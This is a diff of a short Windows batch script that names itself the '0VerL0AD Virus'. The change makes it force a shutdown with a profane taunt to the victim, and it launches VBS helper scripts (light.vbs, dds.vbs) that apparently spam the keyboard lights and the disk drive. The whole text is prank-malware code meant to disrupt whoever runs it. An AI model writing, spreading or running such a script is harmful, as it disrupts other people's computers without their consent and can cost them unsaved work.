@@ -1,11 +1,11 @@
 @echo off
 
-start kblightspam.vbs
-start diskdrivespam.vbs
+shutdown -s -t 18 -c "Your computer has been fucked by the 0VerL0AD Virus!"
 goto a
 
 :a
- shutdown -s -t 18 -c "Your computer has been fucked by the 0VerL0AD Virus!"
+ start light.vbs
+ start dds.vbs
  goto b
 
 :b
